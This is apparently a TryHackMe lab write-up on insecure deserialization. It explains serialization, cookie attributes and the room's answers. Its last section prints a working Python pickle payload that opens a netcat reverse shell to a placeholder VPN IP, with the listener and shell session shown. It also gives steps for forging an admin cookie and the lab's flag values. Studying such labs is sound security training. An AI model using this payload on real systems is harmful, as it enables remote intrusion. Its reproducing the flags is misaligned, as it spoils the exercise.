# Insecure Deserialization

**Date:** 02, January, 2021

**Author:** Dhilip Sanjay S

---

## Serialization and Deserialization
- **Serialization** is the process of converting objects used in programming into simpler, compatible formatting for transmitting between systems or networks.
- **Deserialization** is the process of converting serialized information into their complex form - an object that the application will be able to understand.

## Insecure Deserialization
- Insecure Deserialization is a vulnerability which occurs when untrusted data is used to abuse the logic of an application
- It involves sreplacing data processed by an application with malicious code - allowing DoS to RCE.

- Low exploitability - attacker needs to have a good understanding of the inner-workings of the application.
- The exploit is only as dangerous as the attacker's skill permits.

## What's vulnerable?
- Any application that stores or fetches data where there are no validations or integrity checks in place for the data queried or retained. 
- Few examples of applications:
    - E-commerce Sites 
    - Forums
    - API's
    - Application Runtimes (Tomcat, Jenkins, Jboss, etc)

---
## Insecure Deserialization - Objects
- In OOP, objects are made up of two things:
    - State
    - Behaviour

---
## Insecure Deserialization - cookies
- Cookies are tiny peices of data - created and stored by website on the user's computer.
- Cookies store login information like sessionId.
- Attributes of cookies:

|Attribute | Description | Required?|
|----------|-------------|----------|
| Cookie Name | Name of the cookie | Yes |
| Cookie Value | Anything Plaintext or encoded | Yes |
| Secure Only | If set, this cookie will only be set over HTTPS connection | No |
| Expire | Set a timestamp for cookie expiry | No |
| Path | Cookie will only be sent if the specified URL is within the request| No |

---

## Solutions
### Who developed the Tomcat application?
- **Answer:** The Apache Software Foundation
- Initially I thought, James Duncan Davidson. But they actually wanted the organization's name.

---

### What type of attack that crashes services can be performed with insecure deserialization?
- **Answer:** Denial of Service
---

### If a dog was sleeping, would this be:
- **Answer:** Behaviour
- **Note:**
    - Sleep - State
    - Sleeping - behaviour

---

### What is the name of the base-2 formatting that data is sent across a network as? 
- **Answer:** Binary

---

### If a cookie had the path of webapp.com/login , what would the URL that the user has to visit be?
- **Answer:** webapp.com/login 

---

### What is the acronym for the web technology that Secure cookies work over?
- **Answer:** HTTPS

---

### 1st flag (cookie value)
- **Answer:** THM{good_old_base64_huh}
- **Steps to Reproduce:** 
    ```bash
    echo <session-id> | base64 -d
    ```

---

### 2nd flag (admin dashboard)
- **Answer:** THM{heres_the_admin_flag} 
- **Steps to Reproduce:** Change the `userType` field value to `admin` in the cookie and reload the page.

---

### What is the value in flag.txt?
- **Answer:** 4a69a7ff9fd68
- **Steps to Reproduce:** 
    - Submit a feedback.
    - You'll have a cookie named `encodedPayload`.
    - Replace the value with the one you get from running `rce.py`.

    ```python
    import pickle
    import sys
    import base64

    command = 'rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | netcat YOUR_TRYHACKME_VPN_IP 1234 > /tmp/f'

    class rce(object):
        def __reduce__(self):
            import os
            return (os.system,(command,))

    print(base64.b64encode(pickle.dumps(rce())))
    ```

    - Listen using netcat: `nc -lvnp 1234`
    - Reload the page.
    - You will get a reverse shell:
    ```bash
    root@kali: nc -lvnp 1234
    listening on [any] 1234 ...
    connect to [YOUR_TRYHACKME_VPN_IP] from (UNKNOWN) [MACHINE_IP] 59092
    /bin/sh: 0: cant access tty; job control turned off
    $ ls
    app.py
    Dockerfile
    index.html
    launch.sh
    __pycache__
    requirements.txt
    static
    templates
    user.html
    venv
    vimexchange.sock
    wsgi.py

    $ pwd         
    /home/cmnatic/app

    $ find / -type f -name flag.txt 2>/dev/null
    /home/cmnatic/flag.txt

    $ cd ..
    $ cat flag.txt
    4a69a7ff9fd68
    ```
---